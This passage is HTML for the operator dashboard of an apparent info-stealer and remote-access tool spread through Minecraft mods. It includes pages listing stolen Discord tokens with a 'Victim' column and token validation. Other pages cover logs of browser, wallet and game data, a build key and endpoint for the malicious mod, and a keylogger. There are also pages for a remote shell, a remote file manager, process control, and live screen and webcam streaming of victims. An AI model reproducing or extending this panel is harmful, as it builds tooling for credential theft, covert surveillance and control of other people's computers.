                        <button class="btn btn-secondary" onclick="loadDiscordTokens()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="validateAllTokens()" id="validateAllBtn">
                            <i class="fas fa-check-circle"></i> Validate All
                        </button>
                        <button class="btn btn-secondary" onclick="removeInvalidTokens()" title="Remove Invalid Tokens">
                            <i class="fas fa-trash"></i> Clean Invalid
                        </button>
                    </div>
                </div>
                
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fab fa-discord"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcTotalTokens">0</div>
                        <div class="stat-card-label">Total Tokens</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-check"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcValidTokens">0</div>
                        <div class="stat-card-label">Valid Tokens</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-crown"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcNitroTokens">0</div>
                        <div class="stat-card-label">Nitro Accounts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon purple"><i class="fas fa-file-archive"></i></div>
                        </div>
                        <div class="stat-card-value" id="dcZipTokens">0</div>
                        <div class="stat-card-label">From ZIPs</div>
                    </div>
                </div>
                
                <!-- Search Bar for Discord -->
                <div style="display: flex; gap: 10px; margin-bottom: 16px;">
                    <input type="text" id="discordSearchInput" placeholder="Search by username, email, ID..." 
                           style="flex: 1; padding: 10px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px;"
                           onkeypress="if(event.key==='Enter') searchDiscordTokens()">
                    <button class="btn btn-primary" onclick="searchDiscordTokens()">
                        <i class="fas fa-search"></i> Search
                    </button>
                    <button class="btn btn-secondary" onclick="clearDiscordSearch()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="filter-bar" style="margin-bottom: 16px;">
                    <button class="filter-btn active" onclick="filterDiscordTokens('all')">All</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('direct')"><i class="fas fa-bolt"></i> Direct</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('zip')"><i class="fas fa-file-archive"></i> From ZIP</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('valid')"><i class="fas fa-check"></i> Valid</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('invalid')"><i class="fas fa-times"></i> Invalid</button>
                    <button class="filter-btn" onclick="filterDiscordTokens('nitro')"><i class="fas fa-crown"></i> Nitro</button>
                </div>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>User</th>
                                <th>Token</th>
                                <th>Source</th>
                                <th>Info</th>
                                <th>Victim</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="discordTokensTable"></tbody>
                    </table>
                </div>
                
                <div id="discordTokensLoading" style="text-align: center; padding: 40px; display: none;">
                    <i class="fas fa-spinner fa-spin" style="font-size: 32px; color: var(--discord-blue);"></i>
                    <div style="margin-top: 12px; color: var(--text-secondary);">Loading tokens...</div>
                </div>
            </div>

            <!-- Logs -->
            <div class="page" id="page-logs">
                <div class="page-header">
                    <h1 class="page-title">Logs</h1>
                    <button class="btn btn-secondary" onclick="loadLogs()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
                
                <!-- Search Bar for Logs -->
                <div style="display: flex; gap: 10px; margin-bottom: 16px;">
                    <input type="text" id="logsSearchInput" placeholder="Search by player, PC name, IP, username..." 
                           style="flex: 1; padding: 10px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px;"
                           onkeypress="if(event.key==='Enter') searchLogs()">
                    <button class="btn btn-primary" onclick="searchLogs()">
                        <i class="fas fa-search"></i> Search
                    </button>
                    <button class="btn btn-secondary" onclick="clearLogsSearch()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="filter-bar">
                    <button class="filter-btn active" onclick="filterLogs('all')">All</button>
                    <button class="filter-btn" onclick="filterLogs('minecraft')"><i class="fas fa-cube"></i> Minecraft</button>
                    <button class="filter-btn" onclick="filterLogs('discord')"><i class="fab fa-discord"></i> Discord</button>
                    <button class="filter-btn" onclick="filterLogs('zip')"><i class="fas fa-file-archive"></i> ZIP</button>
                    <button class="filter-btn" onclick="filterLogs('browser')"><i class="fas fa-globe"></i> Browser</button>
                    <button class="filter-btn" onclick="filterLogs('wallet')"><i class="fas fa-wallet"></i> Wallet</button>
                </div>
                <div class="logs-grid" id="logsGrid"></div>
            </div>

            <!-- Settings -->
            <div class="page" id="page-settings">
                <div class="page-header">
                    <h1 class="page-title">Settings</h1>
                </div>
                <div class="table-container" style="padding: 24px;">
                    <h3 style="margin-bottom: 20px;">Build Key</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Use this key in your mod:</p>
                    <div class="build-key-box">
                        <div class="build-key-label">YOUR BUILD KEY</div>
                        <div class="build-key-value" id="buildKey">Loading...</div>
                    </div>
                    
                    <h3 style="margin: 32px 0 20px;">API Endpoint</h3>
                    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Mod sends data to:</p>
                    <div class="build-key-box">
                        <div class="build-key-label">ENDPOINT URL</div>
                        <div class="build-key-value" id="apiEndpoint">Loading...</div>
                    </div>
                    
                    <h3 style="margin: 32px 0 20px;">Change Password</h3>
                    <div class="form-group">
                        <label>Current Password</label>
                        <input type="password" id="currentPassword">
                    </div>
                    <div class="form-group">
                        <label>New Password</label>
                        <input type="password" id="newPassword">
                    </div>
                    <button class="btn btn-primary" onclick="changePassword()">Change Password</button>
                    
                    <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--border);">
                        <button class="btn btn-secondary" onclick="logout()">
                            <i class="fas fa-sign-out-alt"></i> Logout
                        </button>
                    </div>
                </div>
            </div>

            <!-- Users (Admin) -->
            <div class="page" id="page-users">
                <div class="page-header">
                    <h1 class="page-title">User Management</h1>
                    <button class="btn btn-primary" onclick="showCreateUser()">
                        <i class="fas fa-plus"></i> Add User
                    </button>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>User</th>
                                <th>Build Key</th>
                                <th>Stats</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="usersTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- Process Manager -->
            <div class="page" id="page-processes">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-microchip" style="color: var(--accent);"></i> Process Manager</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="processPlayerSelect" class="form-group" style="margin-bottom: 0; width: 200px; padding: 8px; background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border); border-radius: 6px;">
                            <option value="">Select Player...</option>
                        </select>
                        <button class="btn btn-primary" onclick="refreshProcessList()">
                            <i class="fas fa-sync-alt"></i> Refresh List
                        </button>
                    </div>
                </div>
                
                <div id="processManagerStatus" style="margin-bottom: 16px; padding: 12px; background: var(--bg-secondary); border-radius: 8px; font-size: 13px; color: var(--text-secondary);">
                    <i class="fas fa-info-circle"></i> Select a player to view running processes.
                </div>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>Process Name</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="processListTable">
                            <tr><td colspan="3" style="text-align:center; padding: 40px; color: var(--text-muted);">No processes loaded</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Login Logs (Admin) -->
            <div class="page" id="page-login-logs">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-sign-in-alt" style="color: var(--accent); margin-right: 10px;"></i>Login Logs & Security</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadLoginLogs()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-secondary" onclick="showClearLoginLogsModal()">
                            <i class="fas fa-trash"></i> Clear Logs
                        </button>
                    </div>
                </div>
                
                <!-- Stats Cards -->
                <div class="stats-grid" id="loginStatsGrid"></div>
                
                <!-- Filters -->
                <div class="filter-bar" style="margin: 20px 0;">
                    <input type="text" id="loginUsernameFilter" placeholder="Filter by username..." style="padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary); width: 200px;">
                    <input type="text" id="loginIpFilter" placeholder="Filter by IP..." style="padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary); width: 200px; margin-left: 10px;">
                    <button class="btn btn-primary" onclick="loadLoginLogs()" style="margin-left: 10px;">
                        <i class="fas fa-search"></i> Search
                    </button>
                </div>
                
                <!-- Quick Delete Buttons -->
                <div style="display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap;">
                    <button class="btn btn-secondary btn-sm" onclick="clearLoginLogsByType('failed')">
                        <i class="fas fa-times"></i> Clear Failed
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="clearLoginLogsByType('old')">
                        <i class="fas fa-clock"></i> Clear 30+ Days Old
                    </button>
                </div>
                
                <!-- Suspicious Activity Section -->
                <div style="background: var(--bg-card); border: 1px solid var(--danger); border-radius: 8px; padding: 16px; margin-bottom: 20px; display: none;" id="suspiciousActivityBox">
                    <h3 style="color: var(--danger); margin-bottom: 12px;">
                        <i class="fas fa-exclamation-triangle"></i> Suspicious Activity Detected
                    </h3>
                    <div id="suspiciousActivityList"></div>
                </div>
                
                <!-- Two Column Layout: Successful and Failed Logins -->
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <!-- Successful Logins by IP -->
                    <div>
                        <h3 style="margin-bottom: 12px; color: var(--success);">
                            <i class="fas fa-check-circle"></i> Successful Logins by IP
                        </h3>
                        <div class="table-container">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>OS</th>
                                        <th>Users</th>
                                        <th>Count</th>
                                        <th>Last Login</th>
                                        <th style="width: 60px;">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="successfulLoginsTable"></tbody>
                            </table>
                        </div>
                    </div>
                    
                    <!-- Failed Logins by IP -->
                    <div>
                        <h3 style="margin-bottom: 12px; color: var(--danger);">
                            <i class="fas fa-times-circle"></i> Failed Logins by IP
                        </h3>
                        <div class="table-container">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>Attempted Users</th>
                                        <th>Count</th>
                                        <th>Last Attempt</th>
                                        <th style="width: 60px;">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="failedLoginsTable"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Trash (Admin) -->
            <div class="page" id="page-trash">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-trash-restore" style="color: var(--warning); margin-right: 10px;"></i>Deleted Logs (Trash)</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadTrash()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-danger" onclick="emptyTrash()">
                            <i class="fas fa-trash"></i> Empty Trash
                        </button>
                        <button class="btn btn-primary" onclick="createBackup()">
                            <i class="fas fa-download"></i> Create Backup
                        </button>
                    </div>
                </div>
                
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon" style="background: linear-gradient(135deg, var(--warning), #f59e0b);"><i class="fas fa-trash-alt"></i></div>
                        </div>
                        <div class="stat-card-value" id="trashCount">0</div>
                        <div class="stat-card-label">Logs in Trash</div>
                    </div>
                </div>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Original ID</th>
                                <th>Type</th>
                                <th>PC</th>
                                <th>User</th>
                                <th>IP</th>
                                <th>Created</th>
                                <th>Deleted</th>
                                <th>Deleted By</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="trashTable">
                            <tr>
                                <td colspan="9" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    <i class="fas fa-trash-alt" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                                    Trash is empty
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Audit Log (Admin) -->
            <div class="page" id="page-audit">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-clipboard-list" style="color: var(--info); margin-right: 10px;"></i>Audit Log</h1>
                    <button class="btn btn-secondary" onclick="loadAuditLog()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
                
                <p style="color: var(--text-muted); margin-bottom: 20px;">
                    <i class="fas fa-info-circle"></i> All delete actions and important changes are logged here for security.
                </p>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>User</th>
                                <th>Action</th>
                                <th>Details</th>
                                <th>IP</th>
                            </tr>
                        </thead>
                        <tbody id="auditLogTable">
                            <tr>
                                <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    <i class="fas fa-clipboard-list" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                                    No audit logs yet
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- All Logs (Admin) -->
            <div class="page" id="page-alllogs">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-database" style="color: var(--accent); margin-right: 10px;"></i>All Logs by User</h1>
                    <button class="btn btn-secondary" onclick="loadAllUsersLogs()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
                
                <!-- User Tabs -->
                <div class="filter-bar" id="userTabsBar" style="margin-bottom: 20px;">
                    <button class="filter-btn active" onclick="filterUserLogs('all')">
                        <i class="fas fa-globe"></i> All Users
                    </button>
                </div>
                
                <!-- Stats per User -->
                <div id="userStatsContainer" style="margin-bottom: 24px;"></div>
                
                <!-- Logs Grid -->
                <div class="filter-bar" id="allLogsTypeFilter">
                    <button class="filter-btn active" onclick="filterAllLogsByType('all')">All</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('minecraft')"><i class="fas fa-cube"></i> MC</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('discord')"><i class="fab fa-discord"></i> Discord</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('browser')"><i class="fas fa-globe"></i> Browser</button>
                    <button class="filter-btn" onclick="filterAllLogsByType('zip')"><i class="fas fa-file-archive"></i> ZIP</button>
                </div>
                <div class="logs-grid" id="allLogsGrid"></div>
            </div>

            <!-- Remote Control Panel -->
            <div class="page" id="page-remote">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-desktop" style="color: var(--accent);"></i> Remote Control Panel</h1>
                    <button class="btn btn-secondary" onclick="loadRemotePlayers()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
                
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card animate-scale">
                        <div class="stat-icon" style="background: linear-gradient(135deg, #22c55e, #16a34a);">
                            <i class="fas fa-satellite-dish"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-value" id="remoteOnlineCount">0</div>
                            <div class="stat-label">Remote Clients Active</div>
                        </div>
                    </div>
                    <div class="stat-card animate-scale">
                        <div class="stat-icon" style="background: linear-gradient(135deg, #f59e0b, #d97706);">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="stat-info">
                            <div class="stat-value" id="remoteGuardianCount">0</div>
                            <div class="stat-label">Guardian Clients</div>
                        </div>
                    </div>
                </div>
                
                <p style="color: var(--text-secondary); margin-bottom: 20px;">
                    <i class="fas fa-info-circle"></i> Only clients with RemoteControl module or Guardian are shown here.
                </p>
                
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>Client</th>
                                <th>Type</th>
                                <th>PC / User</th>
                                <th>IP / Country</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="remotePlayersTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- Live Screenshare -->
            <div class="page" id="page-screenshare">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-tv" style="color: var(--accent);"></i> Live Screenshare</h1>
                    <div style="display: flex; gap: 8px; align-items: center;">
                        <span id="screenshareAutoStatus" style="color: var(--text-muted); font-size: 12px;">Auto-refresh: <span id="nextRefreshTime">10:00</span></span>
                        <button class="btn btn-secondary" onclick="refreshAllPreviews()">
                            <i class="fas fa-sync-alt"></i> Refresh All
                        </button>
                        <button class="btn btn-primary" onclick="requestAllScreenshots()">
                            <i class="fas fa-camera"></i> Capture All Now
                        </button>
                    </div>
                </div>
                
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-signal"></i></div>
                        </div>
                        <div class="stat-card-value" id="screenshareOnlineCount">0</div>
                        <div class="stat-card-label">Online Clients</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fas fa-images"></i></div>
                        </div>
                        <div class="stat-card-value" id="screenshotTotalCount">0</div>
                        <div class="stat-card-label">Total Screenshots</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-clock"></i></div>
                        </div>
                        <div class="stat-card-value" id="lastCaptureTime">--</div>
                        <div class="stat-card-label">Last Capture</div>
                    </div>
                </div>
                
                <h3 style="margin-bottom: 16px;"><i class="fas fa-desktop"></i> Live Preview Grid</h3>
                <p style="color: var(--text-muted); margin-bottom: 16px; font-size: 13px;">
                    <i class="fas fa-info-circle"></i> Click on any preview to open full-screen stream. Previews auto-refresh every 10 minutes.
                </p>
                
                <div class="webcam-grid" id="screenshareLiveGrid">
                    <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-spinner fa-spin" style="font-size: 32px; margin-bottom: 16px;"></i>
                        <p>Loading online clients...</p>
                    </div>
                </div>
                
                <!-- Screenshot History -->
                <h3 style="margin-top: 32px; margin-bottom: 16px;"><i class="fas fa-history"></i> Recent Screenshots</h3>
                <div class="webcam-grid" id="screenshotHistory"></div>
            </div>

            <!-- Keylogger -->
            <div class="page" id="page-keylogger">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-keyboard" style="color: var(--accent);"></i> Keylogger</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="keylogPlayerSelect" class="btn btn-secondary" style="background: var(--bg-secondary); border: 1px solid var(--border); padding: 8px 16px;">
                            <option value="">-- All Players --</option>
                        </select>
                        <button class="btn btn-secondary" onclick="loadKeylogs()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="startKeylogger()">
                            <i class="fas fa-play"></i> Start Keylogger
                        </button>
                    </div>
                </div>
                
                <div class="table-container" style="max-height: 70vh; overflow-y: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Player</th>
                                <th>Window</th>
                                <th>Keys</th>
                                <th>PC / IP</th>
                            </tr>
                        </thead>
                        <tbody id="keylogTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- Remote Shell -->
            <div class="page" id="page-shell">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-terminal" style="color: var(--accent);"></i> Remote Shell</h1>
                    <select id="shellPlayerSelect" class="btn btn-secondary" style="background: var(--bg-secondary); border: 1px solid var(--border); padding: 8px 16px;">
                        <option value="">-- Select Player --</option>
                    </select>
                </div>
                
                <div style="background: #0d1117; border-radius: 12px; padding: 16px; font-family: 'Consolas', 'Monaco', monospace;">
                    <div id="shellOutput" style="height: 400px; overflow-y: auto; margin-bottom: 16px; white-space: pre-wrap; color: #22c55e; font-size: 13px; line-height: 1.5;">
<span style="color: #f59e0b;">
           OPTIMIZER REMOTE SHELL v2.0                   
         Type commands below and press Enter             
</span>

Waiting for player selection...
                    </div>
                    <div style="display: flex; gap: 8px;">
                        <span style="color: #22c55e;">$</span>
                        <input type="text" id="shellInput" placeholder="Enter command..." 
                               style="flex: 1; background: transparent; border: none; color: #22c55e; font-family: inherit; font-size: 14px; outline: none;"
                               onkeypress="if(event.key==='Enter') sendShellCommand()">
                        <button class="btn btn-primary btn-sm" onclick="sendShellCommand()">
                            <i class="fas fa-paper-plane"></i> Send
                        </button>
                    </div>
                </div>
                
                <h3 style="margin-top: 24px; margin-bottom: 16px;"><i class="fas fa-history"></i> Command History</h3>
                <div class="table-container" style="max-height: 300px; overflow-y: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Player</th>
                                <th>Command</th>
                                <th>Status</th>
                                <th>Result</th>
                            </tr>
                        </thead>
                        <tbody id="shellHistoryTable"></tbody>
                    </table>
                </div>
            </div>

            <!-- File Manager -->
            <div class="page" id="page-files">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-folder-open" style="color: var(--accent);"></i> Remote File Manager</h1>
                    <div style="display: flex; gap: 8px;">
                        <select id="filesPlayerSelect" class="btn btn-secondary" style="background: var(--bg-secondary); border: 1px solid var(--border); padding: 8px 16px;" onchange="onFilePlayerSelected()">
                            <option value="">-- Select Player --</option>
                        </select>
                        <button class="btn btn-primary" onclick="browseToPath()">
                            <i class="fas fa-sync-alt"></i> Browse
                        </button>
                    </div>
                </div>
                
                <div style="display: flex; gap: 8px; margin-bottom: 16px; align-items: center;">
                    <span style="color: var(--text-muted); min-width: 50px;">Path:</span>
                    <input type="text" id="currentPath" value="C:\\" 
                           style="flex: 1; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-family: monospace;"
                           onkeypress="if(event.key==='Enter') browseToPath()">
                    <button class="btn btn-secondary" onclick="goUpDirectory()" title="Go to parent directory">
                        <i class="fas fa-level-up-alt"></i>
                    </button>
                    <button class="btn btn-secondary" onclick="goToHome()" title="Go to user home">
                        <i class="fas fa-home"></i>
                    </button>
                    <button class="btn btn-secondary" onclick="goToDesktop()" title="Go to desktop">
                        <i class="fas fa-desktop"></i>
                    </button>
                </div>
                
                <!-- File Operations Bar -->
                <div style="display: flex; gap: 8px; margin-bottom: 16px; padding: 12px; background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border);">
                    <button class="btn btn-sm btn-secondary" onclick="createNewFolder()">
                        <i class="fas fa-folder-plus"></i> New Folder
                    </button>
                    <button class="btn btn-sm btn-secondary" onclick="uploadFileDialog()">
                        <i class="fas fa-upload"></i> Upload File
                    </button>
                    <input type="file" id="fileUploadInput" style="display: none;" onchange="handleFileUpload(event)">
                    <span id="fileManagerStatus" style="margin-left: auto; color: var(--text-muted); font-size: 13px;">
                        <i class="fas fa-info-circle"></i> Select a player to browse files
                    </span>
                </div>
                
                <div class="table-container" style="max-height: 55vh; overflow-y: auto; background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border);">
                    <table>
                        <thead style="position: sticky; top: 0; background: var(--bg-card); z-index: 1;">
                            <tr>
                                <th style="width: 40px;"></th>
                                <th>Name</th>
                                <th style="width: 100px;">Size</th>
                                <th style="width: 160px;">Modified</th>
                                <th style="width: 150px;">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="fileListTable">
                            <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 40px;">
                                <i class="fas fa-folder-open" style="font-size: 48px; opacity: 0.3; margin-bottom: 16px; display: block;"></i>
                                Select a player and click Browse to explore files
                            </td></tr>
                        </tbody>
                    </table>
                </div>
                
                <div style="margin-top: 16px; padding: 16px; background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border); display: none;" id="filePreview">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                        <h4><i class="fas fa-eye"></i> File Preview: <span id="previewFileName"></span></h4>
                        <button class="btn btn-sm btn-secondary" onclick="closeFilePreview()">
                            <i class="fas fa-times"></i> Close
                        </button>
                    </div>
                    <pre id="filePreviewContent" style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; overflow-x: auto; max-height: 300px; overflow-y: auto; margin: 0; font-size: 12px;"></pre>
                </div>
            </div>
        </main>
    </div>

    <!-- Modal -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modalTitle">Details</h3>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body" id="modalBody"></div>
        </div>
    </div>

    <!-- Screenshare Modal -->
    <div class="screenshare-modal" id="screenshareModal">
        <div class="screenshare-modal-header">
            <div class="screenshare-modal-title">
                <i class="fas fa-tv"></i>
                <span>Live Screenshare</span>
                <span id="screenshareModalPlayer" style="color: var(--accent);"></span>
            </div>
            <div class="screenshare-modal-header-controls">
                <div class="screenshare-modal-status stopped" id="screenshareModalStatus">
                    <i class="fas fa-circle"></i>
                    <span>Not streaming</span>
                </div>
                <div class="volume-control">
                    <i class="fas fa-volume-up" id="screenshareMuteBtn" onclick="toggleScreenshareMute()"></i>
                    <input type="range" class="volume-slider" id="screenshareVolume" min="0" max="100" value="50" oninput="setScreenshareVolume(this.value)">
                    <span class="volume-value" id="screenshareVolumeVal">50%</span>
                </div>
                <button class="screenshare-modal-close" onclick="closeScreenshareModal()">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
        <div class="screenshare-modal-body" onclick="event.target === this && closeScreenshareModal()">
            <img id="screenshareModalImage" class="screenshare-modal-image" style="display: none;" />
            <div id="screenshareModalPlaceholder" style="color: var(--text-muted); text-align: center;">
                <i class="fas fa-desktop" style="font-size: 80px; margin-bottom: 20px; opacity: 0.5;"></i>
                <p style="font-size: 18px;">Click Start to begin streaming</p>
            </div>
        </div>
        <div class="screenshare-fps" id="screenshareFps">0 FPS | Quality: 80</div>
        <div class="screenshare-modal-controls">
            <!-- Quality Control -->
            <div style="margin-bottom: 15px; display: flex; gap: 15px; align-items: center;">
                <div style="flex: 1;">
                    <label for="streamQualitySlider" style="display: block; margin-bottom: 8px; font-size: 12px;">
                        <i class="fas fa-image"></i> Stream Quality
                    </label>
                    <input type="range" id="streamQualitySlider" min="1" max="100" value="80" style="width: 100%;" 
                        oninput="window.streamQuality = this.value; updateStreamQualityLabel()">
                    <small id="qualityLabel" style="color: var(--text-muted);">80 (High)</small>
                </div>
                <div style="flex: 1;">
                    <label for="streamFpsSlider" style="display: block; margin-bottom: 8px; font-size: 12px;">
                        <i class="fas fa-tachometer-alt"></i> Target FPS
                    </label>
                    <select id="streamFpsSlider" onchange="window.streamFps = this.value; updateStreamQualityLabel()" style="width: 100%; padding: 8px;">
                        <option value="15">15 FPS (Low)</option>
                        <option value="24">24 FPS (Normal)</option>
                        <option value="30" selected>30 FPS (High)</option>
                        <option value="60">60 FPS (Ultra)</option>
                    </select>
                </div>
            </div>
            <button class="btn btn-primary" onclick="startScreenshareModal()" id="screenshareStartBtn">
                <i class="fas fa-play"></i> Start Stream
            </button>
            <button class="btn btn-secondary" onclick="stopScreenshareModal()" id="screenshareStopBtn" style="display: none;">
                <i class="fas fa-stop"></i> Stop Stream
            </button>
            <button class="btn btn-secondary" onclick="toggleScreenshareSound()" id="screenshareSoundBtn">
                <i class="fas fa-volume-up"></i> Sound On
            </button>
            <button class="btn btn-secondary" onclick="requestScreenshotModal()">
                <i class="fas fa-camera"></i> Snapshot
            </button>
            <button class="btn btn-secondary" onclick="toggleFullscreen()">
                <i class="fas fa-expand"></i> Fullscreen
            </button>
            <span id="screenshareStats" style="color: var(--text-muted); font-size: 12px;">Ready</span>
        </div>
        <audio id="screenshareAudio" style="display: none;"></audio>
    </div>

    <!-- Webcam Modal (similar to Screenshare) -->
    <div class="screenshare-modal" id="webcamModal">
        <div class="screenshare-modal-header">
            <div class="screenshare-modal-title">
                <i class="fas fa-video"></i>
                <span>Live Webcam</span>
                <span id="webcamModalPlayer" style="color: var(--warning);"></span>
            </div>
            <div class="screenshare-modal-header-controls">
                <div class="screenshare-modal-status stopped" id="webcamModalStatus">
                    <i class="fas fa-circle"></i>
                    <span>Not streaming</span>
                </div>
                <div class="volume-control">
                    <i class="fas fa-volume-up" id="webcamMuteBtn" onclick="toggleWebcamMute()"></i>
                    <input type="range" class="volume-slider" id="webcamVolume" min="0" max="100" value="50" oninput="setWebcamVolume(this.value)">
                    <span class="volume-value" id="webcamVolumeVal">50%</span>
                </div>
                <button class="screenshare-modal-close" onclick="closeWebcamModal()">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
        <div class="screenshare-modal-body" onclick="event.target === this && closeWebcamModal()">
            <img id="webcamModalImage" class="screenshare-modal-image" style="display: none; max-width: 90%; max-height: 90%;" />
            <div id="webcamModalPlaceholder" style="color: var(--text-muted); text-align: center;">
                <i class="fas fa-video" style="font-size: 80px; margin-bottom: 20px; opacity: 0.5;"></i>
                <p style="font-size: 18px;">Click Start to begin webcam stream</p>
            </div>
        </div>
        <div class="screenshare-fps" id="webcamFps">0 FPS | Quality: 80</div>
        <div class="screenshare-modal-controls">
            <!-- Quality Control -->
            <div style="margin-bottom: 15px; display: flex; gap: 15px; align-items: center;">
                <div style="flex: 1;">
                    <label for="webcamQualitySlider" style="display: block; margin-bottom: 8px; font-size: 12px;">
                        <i class="fas fa-image"></i> Stream Quality
                    </label>
                    <input type="range" id="webcamQualitySlider" min="1" max="100" value="80" style="width: 100%;" 
